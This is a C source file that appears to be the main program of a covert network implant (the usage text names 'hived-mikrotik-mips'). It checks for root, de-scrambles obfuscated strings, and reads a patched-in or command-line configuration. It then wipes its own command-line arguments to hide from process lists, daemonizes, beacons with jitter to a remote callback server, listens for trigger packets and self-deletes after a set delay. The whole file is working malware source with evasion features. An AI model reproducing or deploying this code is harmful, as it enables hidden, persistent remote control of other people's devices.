#include <stddef.h>
#include "compat.h"

#define _USE_32BIT_TIME_T
#define _INC_STAT_INL
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>

//String encoding handled via the next 3 included files...
#include "proj_strings_main.h"
#include "string_utils.h"
#include "function_strings.h"
#include "debug.h"
#include "trigger_listen.h"
#include "beacon.h"
#include "persistence.h"
#include "daemonize.h"
#include "self_delete.h"
#include "threads.h"
#include "run_command.h"
#include "trigger_payload.h"
#include "polarssl/sha1.h"
#include "crypto.h"
#include "crypto_strings_main.h"
#include "dns_protocol.h"
#ifdef LINUX
	#include "getopt.h"
#endif

//PolarSSL Files
#include "polarssl/config.h"
#include "polarssl/sha1.h"

#ifndef _SRANDFLAG_
#define _SRANDFLAG_
#include <time.h>
int initSrandFlag = 0;       //Used as a flag to ensure srand is initialized only once...
#endif

#include <signal.h>
#include <unistd.h>
#define _stat stat

//const char* OPT_STRING  = (char*) cIures4j;
const char* ohshsmdlas3r  = (char*) cIures4j;

// from polarssl/net.c
//extern int wsa_init_done;

// Global
unsigned char	ikey[ID_KEY_HASH_SIZE];			// Implant Key
char			sdcfp[SD_PATH_LENGTH] = {"\0"};	// Self delete control file path including filename (e.g /var/.config)
char			sdlfp[SD_PATH_LENGTH] = {"\0"};	// Self delete log file path including filename (e.g /var/.log)

#ifdef DEBUG
int dbug_level_ = 2;				// debug level
#endif

//**************************************************************
// Patchable command line arguments

struct __attribute__ ((packed)) cl_args {
	unsigned int	sig;
	unsigned int	beacon_port;
	unsigned int	trigger_delay;
	unsigned long	init_delay;
	unsigned int	interval;
	unsigned int	jitter;
	unsigned long	delete_delay;
	unsigned int	patched;						// Patched flag
	unsigned char   idKey[ID_KEY_HASH_SIZE];
	char			sdpath[SD_PATH_LENGTH];			// Path of self-delete control files
	char			beacon_ip[256];					// Domain name or IP address of beacon server
	char			dns[2][16];						// DNS server IP addresses (up to 2) in dotted quad format
};

#define SIG_HEAD	0x7AD8CFB6

struct cl_args		args = {SIG_HEAD, 443, 0, 0, 0, 0, 0, 0, {0}, {0}, {0}, {{0}} };

//**************************************************************
D (
static void printUsage(char* exeName)
{
	printf("\n\tUsage:\n\n");
	printf("\t%s -a <address> -i <interval>\n\n", exeName);
	printf("\t\t-a <address>           - beacon IP address to callback to\n");
	printf("\t\t-p <port>              - beacon port (default: 443)\n");
	printf("\t\t-i <interval>          - beacon interval in seconds\n");
	printf("\t\t-k <id key>            - implant key phrase\n");
	printf("\t\t-K <id key>            - implant key file\n");
	printf("\t\t-j <jitter>            - integer for percent jitter (0 <= jitter <= 30, default: 3 )\n");
	printf("\t\t-d <beacon delay>      - initial beacon delay (in seconds, default: 2 minutes)\n");
	printf("\t\t-t <callback delay>    - delay between trigger received and callback +/- 30 seconds (in seconds)\n");
	printf("\t\t-s <self-delete delay> - since last successful trigger/beacon (in seconds, default: 60 days)\n");
	printf("\t\t-S <IP1>[,<IP2>]       - DNS server IP address(es) in dotted quad notation (required if beacon address is a domain name)\n");
	printf("\n\t\t-P <file path>       - directory path for .config and .log files (120 chars max)\n");
#ifdef DEBUG
	printf("\n\t\t-D <debug level>     - debug level between 1 and 9, higher numbers are more verbose\n");
#endif
	printf("\t\t-h                     - print this help menu\n");

	printf( "\n\tExample:\n" );
	printf( "\t\t./hived-mikrotik-mips -a 10.3.2.76 -p 9999 -i 3600 -k Testing\n" );
	printf("\n");
	return;
}
)

//**************************************************************

static int is_elevated_permissions( void );
static void clean_args( int argc, char *argv[], char *new_argv0 );
static void * asloc( char *string );

//**************************************************************

int main(int argc, char** argv)
{
	int				c = 0;
	struct in_addr	beaconIPaddr;
	int				trigger_delay = DEFAULT_TRIGGER_DELAY;
	unsigned long	delete_delay = SELF_DEL_TIMEOUT;
	int				retVal = 0;
	char			sdpath[SD_PATH_LENGTH] = {0};
	FILE			*f;
	struct stat 	st;
	BEACONINFO 		beaconInfo;
#ifndef DEBUG
	int				status = 0;
#endif

 	ikey[0] = '\0';
	init_strings(); 	// De-scramble strings

	// Check to see if we have sufficient root/admin permissions to continue.
	// root/admin permissions required for RAW sockets and [on windows] discovering
	// MAC address of ethernet interface(s)
	if ( is_elevated_permissions() != SUCCESS ) {
		fprintf(stderr,"%s", inp183Aq );
		return 1;
	}

	//initialize srand only once using the initSrandFlag...
    if (!initSrandFlag) {
        srand((unsigned int)time(NULL));
        initSrandFlag = 1;
    }

	//To See Crypto Keys, ENABLE THIS SECTION with debug level 4...
#if 0
	DLX(4,
		printf("\n\n my_dhm_P_String=%s ", my_dhm_P_String);
		printf("\n\n my_dhm_G_String=%s ", my_dhm_G_String);
		printf("\n\n test_ca_crt_String=%s ", test_ca_crt_String);
		printf("\n\n test_srv_crt_String=%s ", test_srv_crt_String);
		printf("\n\n test_srv_key_String=%s ", test_srv_key_String)
	);
#endif

	if (args.patched == 1) {
		// Binary was patched -- all patched times should already be in milliseconds
		beaconInfo.port = args.beacon_port;
		trigger_delay = args.trigger_delay;
		beaconInfo.initDelay = args.init_delay;
		beaconInfo.interval = args.interval;
		beaconInfo.percentVariance = args.jitter * 0.01f;
		delete_delay = args.delete_delay;

		memcpy(ikey, args.idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
		memcpy(sdpath, args.sdpath, SD_PATH_LENGTH * sizeof(char));
		cl_string((unsigned char *)sdpath, sizeof(sdpath));

		cl_string((unsigned char *)args.beacon_ip, sizeof(args.beacon_ip));
		beaconInfo.host = args.beacon_ip;

		cl_string((unsigned char *)args.dns[0], sizeof(args.dns[0]));
		cl_string((unsigned char *)args.dns[1], sizeof(args.dns[1]));
		strcpy(beaconInfo.dns[0], args.dns[0]);
		strcpy(beaconInfo.dns[1], args.dns[1]);
		strcpy(sdcfp, sdpath);

#if 0	// Enable for debugging of patched binaries
		printf("\nBinary was patched with arguments as follows:\n");
		printf("\t%32s: %-s\n", "Beacon Server IP address", beaconInfo.host);
		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
		printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
		printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay);
		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval);
		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
		printf("\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
		printf("\t%32s: %-s\n", "Self Delete Control File Path", sdpath);
		printf("\t%32s: %-d\n\n", "Trigger Delay (+/-30 sec)", args.trigger_delay);
#endif

		goto patched_binary;
	} else {
		beaconInfo.port = DEFAULT_BEACON_PORT;
		beaconInfo.percentVariance = DEFAULT_BEACON_VARIANCE;
	}
	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));

	// process options
	//while(EOF != (c = getopt(argc, argv, OPT_STRING)))
#ifdef DEBUG
	while((c = getopt(argc, argv, "a:cD:d:hi:j:K:k:P:p:S:s:t:")) != -1)
#else
	while((c = getopt(argc, argv, ohshsmdlas3r)) != -1)
#endif
	{
		switch(c)
		{
			case 'a':
				beaconInfo.host = asloc( optarg );
				break;

#ifdef DEBUG
			case 'D':
				dbug_level_ = atoi(optarg);
				break;
#endif

			case 'd':
				// If set to 0, this will disable all beacons...
				beaconInfo.initDelay = strtoul(optarg, NULL, 0);
				break;

			case 'i':
				beaconInfo.interval = atoi(optarg);
				break;

			case 'j':
				if (( atoi(optarg) >= 0 ) && ( atoi(optarg) <= 30 )) {
					beaconInfo.percentVariance = atoi(optarg) * 0.01f;
				}
				else {
					beaconInfo.percentVariance = 0;
				}
				break;

			case 'K':
				{	struct stat	statbuf;

					if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
//						fprintf(stderr, "Option error\n");
						fprintf(stderr, "%s\n", oe1);
						return 2;
					}

					if (access(optarg, R_OK)) {
						fprintf(stderr, "%s\n", oe2);
						return 3;
					}
					if (stat(optarg, &statbuf) != 0) {
						perror("Option K");
						return 3;
					}
					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { 			// Validate that the key text is of sufficient length
						sha1_file((const char *)optarg, ikey);				// Generate the ID key
						DLX(1, displaySha1Hash ("Trigger Key: ", ikey));
						sha1(ikey, ID_KEY_HASH_SIZE, ikey);					// Generate the implant key
						DLX(1, displaySha1Hash ("Implant Key: ", ikey));
						DLX(1, printf("\n\n\n" ));
					} else {
						fprintf(stderr, "%s\n", oe3);
						return 4;
					}
					break;
				}

			case 'k':
				// The implant key is generated from the SHA-1 hash of the SHA-1 hash of the
				// text entered on the command line or by reading the key file.

				if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
//					fprintf(stderr, "%s\n" "Option error");
					fprintf(stderr, "%s\n", oe1);
					return 2;
				}

				if (strlen( optarg ) < ID_KEY_LENGTH_MIN) {
					fprintf(stderr, "%s\n", oe3);
            		return 4;
				}
				DLX(1, printf( "KeyPhrase: %s \n", optarg));
				sha1((const unsigned char *)optarg, strlen(optarg), ikey);
				DLX(1, displaySha1Hash ("Trigger Key: ", ikey));
				sha1(ikey, ID_KEY_HASH_SIZE, ikey);
				DLX(1, displaySha1Hash ("Implant Key: ", ikey));
				DLX(1, printf("\n\n\n"));
				break;

			case 'p':
				beaconInfo.port = atoi(optarg);
				break;

			case 'P':	// Set path for self-delete control and log files
				if (strlen(optarg) + MAX(strlen((const char *)sdc), strlen((const char *)sdl)) + 2 < SD_PATH_LENGTH) {	// Make sure array is large enough for filename, '/' and '\0'
					strcpy(sdcfp, optarg);				// Copy the path from the argument
				} else {
					fprintf(stderr, "%s\n", sde);
					return 5;
				}
				break;

			case 'S':
				{
					char *dns;
					char *address_list;
					address_list = asloc(optarg);

					// Get 1st DNS server address and validate its length
					if ((dns = strtok(address_list, ","))) {
						if (strlen(dns) > 16) {
							fprintf(stderr, "%s\n", oe4);
							return 6;
						}
						strcpy(beaconInfo.dns[0], dns);
					} else {
						beaconInfo.dns[0][0] = '\0';
						fprintf(stderr, "%s\n", sdf);	// Parameter missing
						return 7;
					}

					// Get 2nd DNS server address if it was entered and validate its length
					if ((dns = strtok(NULL, ","))) {
						if (strlen(dns) > 16) {
							fprintf(stderr, "%s\n", oe4);
							return 6;
						}
						strcpy(beaconInfo.dns[1], dns);
					} else
						beaconInfo.dns[1][0] = '\0';
				}
				break;

			case 's':
				delete_delay =  strtoul(optarg, NULL, 10);
				break;

			case 't':
				trigger_delay = atoi(optarg);
				break;

			default:
				DLX(1, printUsage(argv[0]));
				exit(0);
				break;
		}
	}

	// Process environment variables, if needed
	DL(4);
	if (beaconInfo.initDelay > 0 && beaconInfo.interval == 0 ) {
		DLX(1, printf("No Beacon Interval specified!\n"));
		DLX(1, printUsage(argv[0]));
		return 8;
	}

	if  (beaconInfo.initDelay >= (INT_MAX-1)) {
		DLX(1, printUsage(argv[0]));
		return 9;
	}

	if  (beaconInfo.percentVariance == 0) {
		DLX(1, printUsage(argv[0]));
		return 10;
	}

	if (ikey[0] == '\0') {
		DLX(1, printUsage(argv[0]));
		return 11;
	}

	clean_args(argc, argv, NULL);	// Zero command line arguments

////////////////////////////////////////////////////////////////////////////////////////////////////////////////

patched_binary:	// Parsing of command line arguments skipped for patched binaries
	DL(4);
	if (beaconInfo.initDelay > 0) {			// Beacons enabled

		if (beaconInfo.port == 0) {
			DLX(1, printf("No Beacon Port Specified!\n"));
			DLX(1, printUsage(argv[0]));
		}

		if (beaconInfo.host == NULL) {	// At this point, the domain name or IP address appears in beaconInfo.host
				DLX(1, printf("No Beacon IP address specified!\n"));
				DLX(1, printUsage(argv[0]));
				return 12;
		}

		if (inet_pton(AF_INET, beaconInfo.host, &beaconIPaddr) <= 0) {		// Determine if beacon IP is a valid address
			if (args.dns[0] == NULL && args.patched == 0) {					// If not, verify that a DNS server address was specified
				DLX(1, printf("Beacon IP was specified as a domain name, but no valid DNS server address was specified to resolve the name!\n"));
				return 13;
			}
		}
	}

	// Construct self delete control and log files with full path names
	if (strlen((const char *)sdcfp) == 0) {
			strcpy(sdcfp, (const char *)sddp);		// If the path wasn't specified use the default ("/var")
	}

	if (sdcfp[strlen(sdcfp)] != '/')	// If the path is missing a trailing '/', add it.
		strcat(sdcfp, "/");
	strcpy(sdlfp, sdcfp);				// Duplicate the path for the log file
	strcat(sdcfp, (const char *)sdc);	// Add .control filename
	strcat(sdlfp, (const char *)sdl);	// Add .log filename

	DLX(1, printf("Control file: \"%s\"\n", sdcfp));
	DLX(1, printf("    Log file: \"%s\"\n", sdlfp));

	if (stat((char *)sdcfp, &st ) != 0) {
		DLX(1, printf("\"%s\" does not exist, creating it\n", (char *)sdcfp));

		// TODO: Self-delete if this file cannot be opened for writing and use an exit code that's meaningful. (Review exit codes.)
		f = fopen( (char *)sdcfp,"w" );
		if ( f == NULL ) {
			DLX(1, perror("fopen()"));
			DLX(1, printf("\tCould not create file %s\n", (char *)sdcfp));
			exit(0);
		}
		fclose(f);
	} else {
		DLX(1, printf("\"%s\" file already exists\n", (char *)sdcfp ));
	}

#if 0	// Enable for debugging of patched binaries
	printf("\nStarting beacon with the following parameters:\n");
	printf("\t%32s: %-s\n", "Beacon Server", beaconInfo.host);
	printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo.port);
	printf("\t%32s: %-s\n", "Primary DNS Server IP Address", beaconInfo.dns[0]);
	printf("\t%32s: %-s\n", "Secondary DNS Server IP Address", beaconInfo.dns[1]);
	printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo.initDelay);
	printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo.interval);
	printf("\t%32s: %-f\n\n", "Beacon Variance (%)", beaconInfo.percentVariance);
#endif

#ifndef DEBUG
	status = daemonize();	// for Linux and Solaris

	if (status != 0) {
		exit(0);	//parent or error should exit
	}
#endif

	if (beaconInfo.initDelay > 0) {
		// create beacon thread
		DLX(1, printf( "Calling BeaconStart()\n"));
		retVal = beacon_start(&beaconInfo);
		if (0 != retVal) {
			DLX(1, printf("Beacon Failed to Start!\n"));
		}
	} else {
		DLX(1, printf("ALL BEACONS DISABLED, beaconInfo.initDelay <= 0.\n"));
	}

	// delete_delay
	DLX(1, printf("Self delete delay: %lu.\n", delete_delay));

#ifndef __VALGRIND__
	DLX(2, printf( "\tCalling TriggerListen()\n"));
	(void)TriggerListen(trigger_delay, delete_delay);	//TODO: TriggerListen() doesn't return a meaningful value.
#endif

    return 0;
}

//****************************************************************************
// used to copy argv[] elements out so they can be zeroed, if permitted by the OS
// Most helpful for unix-like systems and their process lists
static void * asloc( char *string )
{
    void    *ptr;
    int     len = strlen( string ) + 1;

    ptr = malloc( len + 1 );

    if ( ptr == NULL ) exit( -1 );

    memcpy( ptr, string, len );

    return ptr;
}

//****************************************************************************
/*!
	\brief	Checks to see if process is running with elevated privileges.
	
	This function check if the running process has effective root privileges on Solaris and Linux;
	or Administrator privileges on Windows.

	\param messsage            A pointer to the message the CRC should be calculated on.
	\param size                The number of bytes (uint8_t) in the message.    
	
	\return		success or failure
	\retval     zero if true
*/

static int is_elevated_permissions( void )
{
	// geteuid() returns the effective user ID of the calling process
	// if root, geteuid() will return 0
	return ( geteuid() ? FAILURE : SUCCESS );
}

//****************************************************************************
static void clean_args( int argc, char **argv, char *new_argv0 )
{
    unsigned int	maxlen_argv0 = 0;
	unsigned int	len = 0;
    int				n;

	DLX(3, printf("\tLINUX => Attempting to clean command line arguments\n"));

    for ( n = ( argc - 1 ); n > 0; n-- )
    {
	len = strlen( *(argv + n) );
	DLX(3, printf( "\tCleaning argument #%d with length %d: %s\n", n, len, *(argv + n) ));
        memset( *(argv + n), 0, len );
        maxlen_argv0 += len;
    }

	DLX(3, printf( "\tMax ARGV0 length is %d bytes\n", maxlen_argv0 ));

    if ( ( new_argv0 != NULL ) && ( strlen( new_argv0 ) < maxlen_argv0 ) )
    {
        memset( *argv, 0, maxlen_argv0 );
        strcpy( *argv, new_argv0 );
    }

    return;
}
